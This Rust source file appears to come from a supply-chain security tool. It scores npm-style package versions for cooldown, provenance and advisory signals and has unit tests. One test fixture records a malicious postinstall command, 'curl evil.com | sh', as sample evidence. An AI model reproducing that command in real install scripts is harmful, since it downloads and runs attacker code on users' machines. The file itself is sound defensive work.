use crate::{
    policy::{OnHardSignal, PolicyRule},
    types::{HoldReason, Provenance, Signal, SignalType, Verdict, VersionVerdict},
};
use chrono::{DateTime, Utc};

/// Inputs needed to compute a verdict. All I/O is done outside this module.
pub struct ResolutionInput<'a> {
    pub package: &'a str,
    pub version: &'a str,
    pub published_at: DateTime<Utc>,
    pub provenance: Option<&'a Provenance>,
    pub signals: &'a [Signal],
    pub rule: &'a PolicyRule,
    pub fast_tracked: bool,
    pub now: DateTime<Utc>,
}

/// Pure verdict computation — no I/O, fully testable.
pub fn compute_verdict(input: &ResolutionInput<'_>) -> VersionVerdict {
    let mut reasons: Vec<HoldReason> = Vec::new();
    let mut verdict = Verdict::Allow;

    // Fast-track bypasses cooldown and provenance; still subject to advisory signals.
    let check_cooldown = !input.fast_tracked;
    let check_provenance = !input.fast_tracked;

    // --- Cooldown check ---
    if check_cooldown && input.rule.cooldown_hours > 0 {
        let age_hours = (input.now - input.published_at).num_hours().max(0) as u64;
        if age_hours < input.rule.cooldown_hours {
            let remaining = input.rule.cooldown_hours - age_hours;
            reasons.push(HoldReason::Cooldown {
                remaining_hours: remaining,
            });
            verdict = Verdict::Hold;
        }
    }

    // --- Provenance check ---
    if check_provenance && input.rule.require_provenance {
        let ok = input.provenance.map(|p| p.is_verified()).unwrap_or(false);
        if !ok {
            reasons.push(HoldReason::ProvenanceMissing);
            // Provenance failure is a DENY (not a HOLD) — attestation can't be retried by waiting.
            verdict = Verdict::Deny;
        }
    }

    // --- Signal scoring ---
    let has_advisory = input
        .signals
        .iter()
        .any(|s| s.signal_type == SignalType::AdvisoryMatch);
    if has_advisory {
        reasons.push(HoldReason::Advisory {
            advisory_id: extract_advisory_id(input.signals),
        });
        verdict = Verdict::Deny;
    }

    // Non-advisory signals: sum weights, apply threshold.
    let chain_score: u32 = input
        .signals
        .iter()
        .filter(|s| s.signal_type != SignalType::AdvisoryMatch)
        .map(|s| s.weight)
        .sum();

    if chain_score > 0 {
        let chain_verdict = match input.rule.on_hard_signal {
            OnHardSignal::Deny => Verdict::Deny,
            OnHardSignal::Hold => Verdict::Hold,
        };
        // Only escalate; never relax.
        if chain_verdict == Verdict::Deny || verdict == Verdict::Allow {
            reasons.push(HoldReason::SignalChain {
                chain_id: "composite".into(),
                score: chain_score,
            });
            verdict = escalate(verdict, chain_verdict);
        }
    }

    // Compute expiry: HOLDs expire when cooldown window closes; DENYs and ALLOWs don't expire.
    let expires_at = if verdict == Verdict::Hold {
        reasons.iter().find_map(|r| {
            if let HoldReason::Cooldown { remaining_hours } = r {
                Some(input.now + chrono::Duration::hours(*remaining_hours as i64))
            } else {
                None
            }
        })
    } else {
        None
    };

    VersionVerdict {
        package: input.package.to_string(),
        version: input.version.to_string(),
        verdict,
        reasons,
        signals: input.signals.to_vec(),
        provenance: input.provenance.cloned(),
        computed_at: input.now,
        expires_at,
    }
}

/// Escalate verdict — verdicts only move toward DENY, never back toward ALLOW.
fn escalate(current: Verdict, candidate: Verdict) -> Verdict {
    match (current, candidate) {
        (Verdict::Deny, _) | (_, Verdict::Deny) => Verdict::Deny,
        (Verdict::Hold, _) | (_, Verdict::Hold) => Verdict::Hold,
        _ => Verdict::Allow,
    }
}

fn extract_advisory_id(signals: &[Signal]) -> String {
    signals
        .iter()
        .find(|s| s.signal_type == SignalType::AdvisoryMatch)
        .and_then(|s| s.evidence.get("advisory_id").and_then(|v| v.as_str()))
        .unwrap_or("unknown")
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{
        policy::{OnHardSignal, PolicyRule},
        types::{Severity, SignalType},
    };
    use uuid::Uuid;

    fn make_rule(
        cooldown_hours: u64,
        require_provenance: bool,
        on_hard_signal: OnHardSignal,
    ) -> PolicyRule {
        PolicyRule {
            scope: "**".into(),
            cooldown_hours,
            require_provenance,
            on_hard_signal,
            fast_track: vec![],
            enabled: true,
        }
    }

    fn recent_package() -> DateTime<Utc> {
        Utc::now() - chrono::Duration::hours(1)
    }

    fn old_package() -> DateTime<Utc> {
        Utc::now() - chrono::Duration::hours(200)
    }

    fn advisory_signal() -> Signal {
        Signal {
            id: Uuid::new_v4(),
            signal_type: SignalType::AdvisoryMatch,
            severity: Severity::Critical,
            weight: 100,
            evidence: serde_json::json!({ "advisory_id": "GHSA-0000-0000-0000" }),
            detected_at: Utc::now(),
        }
    }

    fn lifecycle_signal() -> Signal {
        Signal {
            id: Uuid::new_v4(),
            signal_type: SignalType::NewLifecycleScript,
            severity: Severity::High,
            weight: 60,
            evidence: serde_json::json!({ "script": "postinstall", "cmd": "curl evil.com | sh" }),
            detected_at: Utc::now(),
        }
    }

    #[test]
    fn old_package_no_signals_allows() {
        let rule = make_rule(72, false, OnHardSignal::Deny);
        let input = ResolutionInput {
            package: "lodash",
            version: "4.17.21",
            published_at: old_package(),
            provenance: None,
            signals: &[],
            rule: &rule,
            fast_tracked: false,
            now: Utc::now(),
        };
        let v = compute_verdict(&input);
        assert_eq!(v.verdict, Verdict::Allow);
        assert!(v.reasons.is_empty());
    }

    #[test]
    fn new_package_held_for_cooldown() {
        let rule = make_rule(72, false, OnHardSignal::Deny);
        let input = ResolutionInput {
            package: "lodash",
            version: "5.0.0",
            published_at: recent_package(),
            provenance: None,
            signals: &[],
            rule: &rule,
            fast_tracked: false,
            now: Utc::now(),
        };
        let v = compute_verdict(&input);
        assert_eq!(v.verdict, Verdict::Hold);
        assert!(v.expires_at.is_some());
        assert!(matches!(v.reasons[0], HoldReason::Cooldown { .. }));
    }

    #[test]
    fn advisory_signal_always_denies() {
        let rule = make_rule(0, false, OnHardSignal::Hold);
        let input = ResolutionInput {
            package: "vulnerable-pkg",
            version: "1.0.0",
            published_at: old_package(),
            provenance: None,
            signals: &[advisory_signal()],
            rule: &rule,
            fast_tracked: false,
            now: Utc::now(),
        };
        let v = compute_verdict(&input);
        assert_eq!(v.verdict, Verdict::Deny);
    }

    #[test]
    fn mid_cooldown_advisory_escalates_to_deny() {
        // A package in cooldown HOLD that receives an advisory escalates to DENY permanently.
        let rule = make_rule(72, false, OnHardSignal::Deny);
        let input = ResolutionInput {
            package: "pkg",
            version: "1.0.0",
            published_at: recent_package(),
            provenance: None,
            signals: &[advisory_signal()],
            rule: &rule,
            fast_tracked: false,
            now: Utc::now(),
        };
        let v = compute_verdict(&input);
        assert_eq!(v.verdict, Verdict::Deny);
        // Expires_at must be None: DENY doesn't auto-expire.
        assert!(v.expires_at.is_none());
    }

    #[test]
    fn missing_provenance_denies_when_required() {
        let rule = make_rule(0, true, OnHardSignal::Deny);
        let input = ResolutionInput {
            package: "@mycompany/auth",
            version: "1.0.0",
            published_at: old_package(),
            provenance: None,
            signals: &[],
            rule: &rule,
            fast_tracked: false,
            now: Utc::now(),
        };
        let v = compute_verdict(&input);
        assert_eq!(v.verdict, Verdict::Deny);
        assert!(matches!(v.reasons[0], HoldReason::ProvenanceMissing));
    }

    #[test]
    fn fast_track_bypasses_cooldown_and_provenance() {
        let rule = make_rule(72, true, OnHardSignal::Deny);
        let input = ResolutionInput {
            package: "@mycompany/design-tokens",
            version: "2.0.0",
            published_at: recent_package(),
            provenance: None,
            signals: &[],
            rule: &rule,
            fast_tracked: true,
            now: Utc::now(),
        };
        let v = compute_verdict(&input);
        assert_eq!(v.verdict, Verdict::Allow);
    }

    #[test]
    fn fast_track_does_not_bypass_advisory() {
        let rule = make_rule(72, true, OnHardSignal::Deny);
        let input = ResolutionInput {
            package: "@mycompany/design-tokens",
            version: "2.0.0",
            published_at: recent_package(),
            provenance: None,
            signals: &[advisory_signal()],
            rule: &rule,
            fast_tracked: true,
            now: Utc::now(),
        };
        let v = compute_verdict(&input);
        // Advisory overrides fast-track.
        assert_eq!(v.verdict, Verdict::Deny);
    }

    #[test]
    fn on_hard_signal_hold_holds_not_denies() {
        let rule = make_rule(0, false, OnHardSignal::Hold);
        let input = ResolutionInput {
            package: "pkg",
            version: "1.0.0",
            published_at: old_package(),
            provenance: None,
            signals: &[lifecycle_signal()],
            rule: &rule,
            fast_tracked: false,
            now: Utc::now(),
        };
        let v = compute_verdict(&input);
        assert_eq!(v.verdict, Verdict::Hold);
    }
}
